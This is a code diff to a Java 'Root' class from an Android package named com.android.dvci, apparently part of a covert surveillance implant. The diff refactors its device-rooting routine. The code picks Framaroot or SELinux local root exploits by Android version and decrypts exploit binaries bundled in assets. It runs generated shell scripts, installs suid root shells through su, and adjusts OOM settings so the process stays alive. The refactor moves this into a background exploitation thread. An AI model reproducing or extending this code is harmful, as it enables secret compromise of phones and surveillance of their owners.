@@ -1,28 +1,7 @@
 package com.android.dvci;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.security.InvalidAlgorithmParameterException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
-import java.util.Date;
-import java.util.List;
-import java.util.Properties;
-
-import javax.crypto.Cipher;
-import javax.crypto.CipherInputStream;
-import javax.crypto.NoSuchPaddingException;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
-
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.widget.Toast;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
@@ -36,6 +15,26 @@ import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+import java.util.Date;
+import java.util.Properties;
+import java.util.concurrent.Semaphore;
+
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
 
 public class Root {
 	private static final String TAG = "Root";
@@ -59,16 +58,16 @@ public class Root {
 	static public boolean shouldAskForAdmin() {
 		boolean ret = false;
 
-		if (PackageInfo.checkRoot() == true) {
+		if (PackageInfo.checkRoot()) {
 			ret = false;
 		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
-																// HONEYCOMB_MR2
+			// HONEYCOMB_MR2
 			ret = !checkFramarootExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
-																										// -
-																										// JELLY_BEAN_MR1
+			// -
+			// JELLY_BEAN_MR1
 			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
 			ret = !checkSELinuxExploitability();
@@ -112,70 +111,34 @@ public class Root {
 			return false;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
-																// HONEYCOMB_MR2
+			// HONEYCOMB_MR2
 			// Framaroot
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
 			}
 
-			if (checkFramarootExploitability()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
-				}
-				method = M.e("framaroot");
-				framarootExploit();
-			}
+			linuxExploit(true, false);
+			return true;
+
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
-																										// -
-																										// JELLY_BEAN_MR1
+			// -
+			// JELLY_BEAN_MR1
 			if (Cfg.DEBUG) {
 				Check.log(TAG
 						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
 			}
 
-			if (checkFramarootExploitability()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
-				}
-				method = M.e("framaroot");
-				framarootExploit();
-			}
+			linuxExploit(true, true);
+			return true;
 
-			if (PackageInfo.checkRoot() == false) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(exploitPhone): Framaroot exploitation failed, using SELinux exploitation");
-				}
-
-				if (checkSELinuxExploitability()) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
-					}
-					method = M.e("selinux");
-					selinuxExploit();
-					return true;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
-					}
-				}
-			}
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
 			}
 
-			if (checkSELinuxExploitability()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
-				}
-				method = M.e("selinux");
-				selinuxExploit();
-				return true;
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
-				}
-			}
+			linuxExploit(false, true);
+			return true;
+
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			// Nada
 			if (Cfg.DEBUG) {
@@ -185,6 +148,7 @@ public class Root {
 		return false;
 
 	}
+
 
 	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
@@ -307,8 +271,6 @@ public class Root {
 			Utils.sleep(5000);
 
 			if (PackageInfo.checkRoot()) {
-				Status.setRoot(true);
-
 				Status.self().setReload();
 			}
 		}
@@ -327,7 +289,7 @@ public class Root {
 			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);
 
-			ExecuteResult res = Execute.execute(new String[] { SU, "-c", suidext.getFilename() + " rt" });
+			ExecuteResult res = Execute.execute(new String[]{SU, "-c", suidext.getFilename() + " rt"});
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
@@ -336,8 +298,6 @@ public class Root {
 			suidext.delete();
 
 			if (PackageInfo.checkRoot()) {
-				Status.setRoot(true);
-
 				Status.self().setReload();
 			}
 
@@ -387,8 +347,8 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-			ExecuteResult res = Execute.execute(new String[] { SU, "-c",
-					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
+			ExecuteResult res = Execute.execute(new String[]{SU, "-c",
+					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename()});
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
@@ -397,11 +357,6 @@ public class Root {
 			shellInstaller.delete();
 			selinuxSuidext.delete();
 
-			if (PackageInfo.checkRoot()) {
-				Status.setRoot(true);
-
-				Status.self().setReload();
-			}
 
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -437,7 +392,7 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);
 
-			ExecuteResult res = Execute.execute(new String[] { SU, "-c", selinuxSuidext.getFilename() + " rt" });
+			ExecuteResult res = Execute.execute(new String[]{SU, "-c", selinuxSuidext.getFilename() + " rt"});
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + res.exitCode);
@@ -496,17 +451,25 @@ public class Root {
 		}
 		// preprocess/expl_check
 		InputStream stream = Utils.getAssetStream(M.e("hb.data"));
+		Check.asserts(stream != null, "Null asset");
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkFramarootExploitability) ");
 		}
 
 		try {
-			fileWrite(exploitCheck, stream, Cfg.RNDDB);
+			boolean written = fileWrite(exploitCheck, stream, Cfg.RNDDB);
+			if (!written) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (checkFramarootExploitability), cannot write file");
+				}
+				return false;
+			}
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 			int ret = Execute.execute(path + M.e("/ec")).exitCode;
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
+				Check.log(TAG + " (checkFramarootExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
 						+ " ret: " + ret);
 			}
 
@@ -521,7 +484,7 @@ public class Root {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (checkFramarootExploitability): Exception"); //$NON-NLS-1$
 			}
 
 			return false;
@@ -609,7 +572,7 @@ public class Root {
 				Root.removeScript("les");
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (localExploit), cannot create script");
+					Check.log(TAG + " ERROR: (framarootExploit), cannot create script");
 				}
 			}
 
@@ -627,22 +590,25 @@ public class Root {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (framarootExploit): Exception"); //$NON-NLS-1$
 			}
 
 			return false;
 		}
 	}
 
-	static public void selinuxExploit() {
+
+	private static void linuxExploit(boolean frama, boolean selinux) {
+
 		// Start exploitation thread
-		SelinuxExploitThread selinuxThread = new SelinuxExploitThread();
-		Thread exploit = new Thread(selinuxThread);
+		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux);
+		Thread exploit = new Thread(linuxThread);
 		exploit.start();
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(selinuxExploit): exploitation thread running");
+			Check.log(TAG + "(linuxExploit): exploitation thread running");
 		}
+
 	}
 
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
@@ -711,7 +677,7 @@ public class Root {
 		Status.setSu(PackageInfo.hasSu());
 
 		// Abbiamo la root?
-		Status.setRoot(PackageInfo.checkRoot());
+		//PackageInfo.checkRoot();
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
@@ -735,7 +701,7 @@ public class Root {
 			Root.supersuRoot();
 
 			// Cyanogen should disable the superuser notification
-			Status.setRoot(PackageInfo.checkRoot());
+			PackageInfo.checkRoot();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
@@ -757,7 +723,7 @@ public class Root {
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 
-		return PackageInfo.checkRoot();
+		return Status.haveRoot();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
@@ -963,81 +929,71 @@ public class Root {
 		return 1;
 	}
 
-	static class SuperuserThread implements Runnable {
-		private static final String TAG = "superuserThread";
+	static class LinuxExploitThread implements Runnable {
+		private static final String TAG = "selinuxExploitThread";
+		private final boolean frama;
+		private final boolean selinux;
+
+		Semaphore semaphore = new Semaphore(1);
+
+		public LinuxExploitThread(boolean frama, boolean selinux) {
+			this.frama = frama;
+			this.selinux = selinux;
+		}
 
 		@Override
 		public void run() {
 
-			final File filesPath = Status.getAppContext().getFilesDir();
-			// final String path = filesPath.getAbsolutePath();
-			String pack = Status.self().getAppContext().getPackageName();
-			final String installPath = String.format(M.e("/data/data/%s/files"), pack);
-
-			final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("qj")); // selinux_suidext
-			final AutoFile shellInstaller = new AutoFile(installPath, M.e("tk")); // shell_installer.sh
-
 			try {
-				// selinux_suidext
-				InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
-				// shell_installer.sh
-				InputStream streamK = Utils.getAssetStream(M.e("kb.data"));
-
-				fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
-				fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
-
-				if (Cfg.DEBUG) {
-					Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: "
-							+ selinuxSuidext);
-					Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: "
-							+ shellInstaller);
+				if (!semaphore.tryAcquire()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (exploitPhone), already exploiting");
+					}
+					return;
 				}
 
-				// Proviamoci ad installare la nostra shell root
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
-					Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
+				if (frama ){
+					if(checkFramarootExploitability()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (exploitPhone): Device seems frama exploitable"); //$NON-NLS-1$
+						}
+						method = M.e("framaroot");
+						runFramalinuxExploit();
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (exploitPhone), not exploitable by Framaroot");
+						}
+					}
 				}
 
-				Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
-
-				ExecuteResult res = Execute.execute(new String[] { SU, "-c",
-						shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
+				if (selinux && PackageInfo.checkRoot() == false){
+					if(checkSELinuxExploitability()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
+						}
+						method = M.e("selinux");
+						runSelinuxExploit();
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (exploitPhone), not exploitable by Selinux");
+						}
+					}
 				}
 
-				if (PackageInfo.checkRoot()) {
-					Status.setRoot(true);
-
+			} finally {
+				if (getPermissions()) {
 					Status.self().setReload();
 				}
-
-			} catch (final Exception e1) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e1);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(e1);//$NON-NLS-1$
-					Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
-				}
-
-				return;
-			} finally {
-				shellInstaller.delete();
-				selinuxSuidext.delete();
+				semaphore.release();
 			}
 
 		}
-	}
 
-	static class SelinuxExploitThread implements Runnable {
-		private static final String TAG = "selinuxExploitThread";
+		public void runFramalinuxExploit() {
+			framarootExploit();
+		}
 
-		@Override
-		public void run() {
+		public void runSelinuxExploit() {
 			final File filesPath = Status.getAppContext().getFilesDir();
 			final String path = filesPath.getAbsolutePath();
 			final String localExploit = M.e("vs"); // selinux_exploit
@@ -1047,7 +1003,7 @@ public class Root {
 			AutoFile vs = new AutoFile(path, localExploit);
 			if (vs.exists()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (run) localexploit running?");
+					Check.log(TAG + " (runSelinuxExploit) localexploit running?");
 				}
 				return;
 			}
@@ -1055,7 +1011,7 @@ public class Root {
 			try {
 				InputStream streamExpl = Utils.getAssetStream(M.e("gb.data")); // selinux_exploit
 				InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("jb.data")); // selinux_suidext
-																						// rilcap
+				// rilcap
 				InputStream streamSuidext = Utils.getAssetStream(M.e("sb.data")); // suidext
 
 				Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
@@ -1074,7 +1030,7 @@ public class Root {
 				String script = M.e("#!/system/bin/sh")
 						+ "\n"
 						+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"),
-								pack, pack, pack) + "\n";
+						pack, pack, pack) + "\n";
 
 				if (Root.createScript("fig", script) == true) {
 					Process runScript = Runtime.getRuntime().exec(path + "/fig");
@@ -1096,7 +1052,7 @@ public class Root {
 						for (String s : result.stdout) {
 							if (s.contains("/files/vs")) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + "(run): exploitation in progress");
+									Check.log(TAG + "(runSelinuxExploit): exploitation in progress");
 								}
 
 								finished = false;
@@ -1104,16 +1060,22 @@ public class Root {
 							}
 						}
 
-						if (finished || PackageInfo.checkRoot()) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(run): exploitation terminated after "
-										+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+						if (finished) {
+							if(PackageInfo.checkRoot()) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "(runSelinuxExploit): exploitation terminated after "
+											+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+								}
+
+								Status.setRoot(true);
+								Status.self().setReload();
+
+								break;
+							}else{
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " ERROR: (runSelinuxExploit), CANNOT GET ROOT by seLinux");
+								}
 							}
-
-							Status.setRoot(true);
-							Status.self().setReload();
-
-							break;
 						}
 
 						finished = true;
@@ -1124,9 +1086,9 @@ public class Root {
 
 				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " ERROR: (run), cannot create script");
+						Check.log(TAG + " ERROR: (runSelinuxExploit), cannot create script");
 					}
-					PackageInfo.checkRoot();
+					//PackageInfo.checkRoot();
 				}
 
 			} catch (final Exception e1) {
@@ -1136,7 +1098,7 @@ public class Root {
 
 				if (Cfg.DEBUG) {
 					Check.log(e1);//$NON-NLS-1$
-					Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
+					Check.log(TAG + " (runSelinuxExploit): Exception"); //$NON-NLS-1$
 				}
 
 				return;
@@ -1150,9 +1112,7 @@ public class Root {
 				file = new File(Status.getAppContext().getFilesDir(), suidext);
 				file.delete();
 
-				if (getPermissions()) {
-					Status.self().setReload();
-				}
+
 			}
 		}
 	}
